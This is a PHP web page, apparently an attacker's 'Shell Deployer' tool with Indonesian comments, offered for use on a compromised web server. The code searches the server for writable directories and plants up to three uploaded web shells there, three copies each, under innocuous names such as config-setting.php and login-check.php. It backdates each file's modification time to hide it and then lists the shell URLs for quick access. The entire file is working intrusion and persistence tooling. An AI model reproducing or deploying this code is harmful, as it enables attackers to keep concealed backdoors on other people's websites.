<?php
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

/**
 * Scan folder writable hingga kedalaman tertentu
 */
function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
    $result = [];

    if ($currentDepth > $maxDepth) return $result;
    $items = @scandir($baseDir);
    if (!$items) return $result;

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $fullPath = rtrim($baseDir, '/') . '/' . $item;
        if (is_dir($fullPath)) {
            if (is_writable($fullPath)) {
                $result[] = $fullPath;
            }
            $result = array_merge(
                $result,
                scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1)
            );
        }
    }

    return $result;
}

/**
 * Stock nama file yang banyak biar bisa milih dan bergantian
 */
function getStockFilenames() {
    return [
        'notes.php',
        'data-info.php', 
        'extra-file.php',
        'sample-page.php',
        'draft-note.php',
        'temp-data.php',
        'manual-page.php',
        'archive-note.php',
        'backup-data.php',
        'config-setting.php',
        'system-info.php',
        'error-log.php',
        'debug-mode.php',
        'temp-file.php',
        'cache-data.php',
        'session-info.php',
        'user-data.php',
        'admin-page.php',
        'login-check.php',
        'auth-system.php',
        'api-endpoint.php',
        'webhook-listener.php',
        'cron-job.php',
        'task-runner.php',
        'mailer.php',
        'smtp-test.php',
        'db-connect.php',
        'sql-query.php',
        'file-manager.php',
        'image-upload.php'
    ];
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Shell Deployer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        :root {
            --primary: #00ff00;
            --background: #000000;
            --surface: #111111;
            --text: #00ff00;
            --success: #00ff00;
            --error: #ff0000;
            --border: #333333;
        }
        * { box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { margin: 0; padding: 0; background-color: var(--background); color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background-color: var(--surface); border: 2px solid var(--primary); border-radius: 0px; padding: 30px; width: 100%; max-width: 800px; box-shadow: 0 0 20px var(--primary); }
        h1 { text-align: center; color: var(--primary); font-weight: bold; margin-bottom: 20px; text-transform: uppercase; }
        label { display: block; margin-bottom: 10px; font-size: 14px; color: #00ff00; }
        input[type="file"] { width: 100%; background-color: #000000; color: var(--text); border: 2px dashed var(--primary); border-radius: 0px; padding: 15px; margin-bottom: 20px; font-size: 14px; cursor: pointer; }
        button { width: 100%; background: #000000; color: var(--primary); font-weight: bold; border: 2px solid var(--primary); border-radius: 0px; padding: 15px; cursor: pointer; font-size: 16px; transition: all 0.2s ease; text-transform: uppercase; }
        button:hover { background: var(--primary); color: #000000; }
        .message { margin-top: 25px; padding: 15px; border-radius: 0px; font-size: 14px; line-height: 1.5; border: 1px solid; }
        .success { background-color: rgba(0, 255, 0, 0.1); color: var(--success); border-color: var(--success); }
        .error { background-color: rgba(255, 0, 0, 0.1); color: var(--error); border-color: var(--error); }
        code { font-family: 'Courier New', monospace; font-size: 12px; color: #00ff00; }
        ul { margin: 10px 0 0 0; padding: 0; list-style: none; }
        li { padding: 8px 0; border-bottom: 1px solid #333; }
        li:last-child { border-bottom: none; }
        a { color: #00ffff; text-decoration: none; }
        a:hover { text-decoration: underline; color: #ffffff; }
        .url-box { background: #000; border: 1px solid #333; padding: 10px; margin: 5px 0; word-break: break-all; }
        .file-info { color: #00aa00; font-size: 11px; margin-left: 10px; }
        .terminal { background: #000; border: 1px solid #00ff00; padding: 15px; margin-top: 20px; font-family: monospace; font-size: 12px; }
        .blink { animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
        .stock-info { color: #00ffff; font-size: 11px; margin-top: 5px; }
    </style>
</head>
<body>
<div class="card">
    <h1>⚡ SHELL DEPLOYER ⚡</h1>
    <div class="stock-info">📁 Stock names: <?php echo implode(', ', array_slice(getStockFilenames(), 0, 8)); ?> ... dan <?php echo count(getStockFilenames()) - 8; ?> lainnya</div>
    <form method="post" enctype="multipart/form-data">  
        <label for="files">UPLOAD SHELL (Max 3 files, tiap file dapat 3 copy dengan nama random dari stock):</label>
        <input type="file" name="files[]" id="files" multiple required>
        <button type="submit">🚀 DEPLOY SHELL NOW</button>
    </form>

<?php
if (isset($_FILES['files'])) {
    echo '<div class="terminal">';
    echo '$ <span class="blink">▋</span> Scanning writable directories...<br>';
    
    $files = $_FILES['files'];
    $totalFiles = min(count($files['name']), 3);
    
    $stockFilenames = getStockFilenames();
    $allWritable = scanWritableDirs(__DIR__, 6);
    
    if (empty($allWritable)) {
        echo '<span style="color:#ff0000">✗ No writable directories found</span><br>';
        echo '</div>';
        echo "<div class='message error'>ERROR: Tidak ditemukan folder writable.</div>";
    } else {
        shuffle($allWritable);
        $successCount = 0;
        $uploadedURLs = [];
        
        echo '$ <span class="blink">▋</span> Found ' . count($allWritable) . ' writable directories<br>';
        echo '$ <span class="blink">▋</span> Processing ' . $totalFiles . ' shell files (masing-masing 3 copy)...<br>';
        
        for ($i = 0; $i < $totalFiles; $i++) {
            if ($files['error'][$i] !== UPLOAD_ERR_OK) continue;
            
            $tmp_name = $files['tmp_name'][$i];
            $originalContent = @file_get_contents($tmp_name);
            
            if ($originalContent === false) continue;
            
            echo '$ <span class="blink">▋</span> Deploying: ' . htmlspecialchars($files['name'][$i]) . '<br>';
            
            // 3 copy untuk setiap shell
            for ($copy = 1; $copy <= 3; $copy++) {
                if (empty($allWritable)) break;
                
                // Get random folder
                $randomKey = array_rand($allWritable);
                $folder = $allWritable[$randomKey];
                unset($allWritable[$randomKey]);
                
                $randomDateTime = date('Y-m-d H:i', strtotime('-' . rand(0, 90) . ' days'));
                $timestamp = strtotime($randomDateTime);
                
                // Pilih nama random dari stock (bebas milih)
                $randomName = $stockFilenames[array_rand($stockFilenames)];
                $target = $folder . DIRECTORY_SEPARATOR . $randomName;
                
                // KEEP ORIGINAL SHELL CONTENT
                $modifiedContent = $originalContent;
                
                // Save shell file
                if (@file_put_contents($target, $modifiedContent) !== false) {
                    @touch($target, $timestamp, $timestamp);
                    @chmod($target, 0644);
                    
                    // Generate URL
                    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
                    $folderPath = realpath($folder);
                    
                    if (strpos($folderPath, $docRoot) === 0) {
                        $relativePath = substr($folderPath, strlen($docRoot));
                    } else {
                        $relativePath = str_replace($docRoot, '', $folderPath);
                    }
                    
                    $relativePath = str_replace('\\', '/', $relativePath);
                    $relativePath = trim($relativePath, '/');
                    
                    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                    $host = $_SERVER['HTTP_HOST'];
                    
                    $url = $protocol . '://' . $host . '/' . $relativePath . '/' . $randomName;
                    $url = preg_replace('/([^:])\/\//', '$1/', $url);
                    
                    $successCount++;
                    $uploadedURLs[] = [
                        'url' => $url,
                        'filename' => $randomName,
                        'original' => $files['name'][$i],
                        'folder' => $folder
                    ];
                    
                    echo '  ✓ Copy ' . $copy . ': ' . $randomName . '<br>';
                }
            }
        }
        
        echo '$ <span class="blink">▋</span> Deployment complete!<br>';
        echo '</div>';
        
        if ($successCount > 0) {
            $totalUploaded = $totalFiles;
            
            echo "<div class='message success'>";
            echo "<strong>✅ SUCCESS: {$totalUploaded} shell(s) × 3 copies = {$successCount} total files</strong><br><br>";
            
            echo "<ul>";
            foreach ($uploadedURLs as $index => $fileData) {
                $number = $index + 1;
                echo "<li>";
                echo "<div class='url-box'>";
                echo "<strong>[{$number}]</strong> <a href=\"{$fileData['url']}\" target=\"_blank\">{$fileData['url']}</a>";
                echo "<div class='file-info'>";
                echo "Original: {$fileData['original']} → Deployed as: <strong style='color:#ffff00'>{$fileData['filename']}</strong>";
                echo "</div>";
                echo "</div>";
                echo "</li>";
            }
            echo "</ul>";
            
            // One-click access
            echo "<br><div style='text-align:center;'>";
            echo "<button onclick='openAllShells()' style='width:auto;padding:10px 20px;margin:5px;background:#000;color:#0f0;'>🖥️ OPEN ALL SHELLS</button> ";
            echo "<button onclick='copyAllURLs()' style='width:auto;padding:10px 20px;margin:5px;background:#000;color:#0ff;'>📋 COPY ALL URLS</button>";
            echo "</div>";
            
            echo "</div>";
            
            // JavaScript
            echo "<script>
            function openAllShells() {
                " . implode("\n", array_map(function($file) {
                    return "window.open('{$file['url']}', '_blank');";
                }, $uploadedURLs)) . "
            }
            
            function copyAllURLs() {
                const urls = `" . implode("\n", array_map(function($file) {
                    return $file['url'];
                }, $uploadedURLs)) . "`;
                navigator.clipboard.writeText(urls).then(() => {
                    alert('All shell URLs copied to clipboard!');
                });
            }
            </script>";
        } else {
            echo "<div class='message error'>✗ ERROR: Failed to deploy shells to any directory.</div>";
        }
    }
}
?>
</div>

<script>
// File selection limit
document.getElementById('files').addEventListener('change', function(e) {
    if (this.files.length > 3) {
        alert('Maximum 3 shell files allowed. Only first 3 will be deployed.');
        const dataTransfer = new DataTransfer();
        for (let i = 0; i < Math.min(3, this.files.length); i++) {
            dataTransfer.items.add(this.files[i]);
        }
        this.files = dataTransfer.files;
    }
});

// Drag and drop styling
const fileInput = document.getElementById('files');
fileInput.addEventListener('dragover', (e) => {
    e.preventDefault();
    fileInput.style.borderColor = '#00ffff';
    fileInput.style.background = 'rgba(0, 255, 255, 0.1)';
});

fileInput.addEventListener('dragleave', () => {
    fileInput.style.borderColor = '#00ff00';
    fileInput.style.background = '#000000';
});

fileInput.addEventListener('drop', (e) => {
    e.preventDefault();
    fileInput.style.borderColor = '#00ff00';
    fileInput.style.background = '#000000';
});
</script>
</body>
</html>
